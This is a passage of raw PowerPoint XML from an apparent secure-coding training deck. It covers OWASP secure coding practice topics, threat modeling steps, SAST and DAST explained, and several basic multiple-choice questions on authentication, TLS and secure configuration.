          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>1. Input Validation &amp; Data Handling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>2. Authentication &amp; Authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>3. Cryptography</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>4. Error &amp; Exception Handling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>5. Secure Database Practices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>6. Secure Session Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>7. Code Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>8. Secure Deployment &amp; Configuration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>9. Logging &amp; Monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>10. Regular Testing &amp; Updates</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>*OWASP Secure Coding Practices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3389836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56D4C-4804-F016-46D6-99199BF0CF40}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Threat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>Modeling</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{31F35593-8DD2-344E-4702-2D6F796641F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Threat Modeling is a structured process for identifying, evaluating, and mitigating potential security threats and vulnerabilities in a system before or during development.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> Steps in Threat Modeling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>1. Identify Assets: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>What needs protection?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>2. Create an Architecture Diagram: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Visualize the system: users, applications, databases, APIs, networks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>3. Identify Threats: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use structured approaches like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>STRIDE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>attack trees</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>4. Analyze Vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>5. Assess Risks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>6. Mitigation Strategies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>7. Validate &amp; Review</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12813429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C47C1-7C44-48F0-7B9F-6252103B74FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>SAST (Static Application Security Testing)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2BE22554-2171-D91E-3252-628B22A5C38C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215749"/>
            <a:ext cx="7704000" cy="3862611"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Scans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>source code, bytecode, or binaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Identifies vulnerabilities early in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>SDLC (development stage)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Finds issues like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>XSS (Cross-Site Scripting)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Hardcoded secrets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Insecure API calls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Advantages:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Detects vulnerabilities </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>before execution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Easy to integrate into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>CI/CD pipelines</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Covers 100% of codebase (if properly configured).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29037458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9398D-43F7-CCB6-A5CB-85BB22D0274B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>DAST (Dynamic Application Security Testing)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DDF1E5A-59D1-772B-3FF6-B7563F8B1639}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Simulates </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>real-world attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> against a running application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Focuses on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>runtime behavior</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and exposed endpoints.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Finds issues like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Authentication/Authorization flaws</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Session management issues</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Insecure configurations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Business logic vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Advantages:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No need for source code access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Detects </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>runtime vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> missed by SAST.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Mimics attacker’s perspective.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tools: OWASP ZAP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2746681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4FAAA-21AC-DBC5-30BE-16C8C94A3A1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>SAST vs DAST</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{820E4AF1-5D33-C417-51B9-E880E020C6AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1267736"/>
            <a:ext cx="7598090" cy="3338880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4124884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886D47F-1A53-E336-7FC8-6DE90C2C0224}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Which of the following is a commonly used protocol to secure data transmission over a network?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A) FTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B) TLS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C) SMTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>D) IMAP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16504325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83F8338-1DD2-EE4A-8D8F-D21D70AAF719}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What is the primary difference between authentication and authorization?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A) Authentication verifies identity; authorization grants access rights.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B) Authentication grants access rights; authorization verifies identity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C) Authentication encrypts data; authorization decrypts data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>D)Authentication involves session management; authorization involves data management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16803851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1CC08A3-8EC0-D64A-DE22-D5336DC6E7D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Which of the following is a best practice for implementing strong authentication in web applications?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A) Using multi-factor authentication (MFA).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B) Storing passwords in plain text.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C) Allowing users to reuse passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>D) Disabling account lockout mechanisms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27455999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F80FA75-78B7-C57E-6E5F-0565F934EB34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Which of the following is a best practice for secure configuration?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A) Enabling all features and services by default.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B) Using default credentials and settings for all components.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C) Disabling unnecessary services and changing default credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>D) Avoiding configuration documentation to protect security settings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19324015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4309718-25D4-A86E-31BE-91F951897CC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What is the primary goal of secure architecture design in application development?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A) To improve the visual design of the application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B) To ensure that the application is user-friendly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C) To minimize security risks by designing security into the application from the outset.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>D) To reduce the cost of application development.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32998988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9B6EDAF-0A87-B1A1-D74A-5A1EE2E2FE8F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What is the primary objective of data protection in application design?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A) To optimize data retrieval times.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B) To prevent unauthorized access, alteration, or deletion of sensitive data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C) To improve the aesthetics of data presentation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>D) To allow unrestricted access to all data by all users.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39177732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E1C9324-D81F-92AA-2332-BFD0285953E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
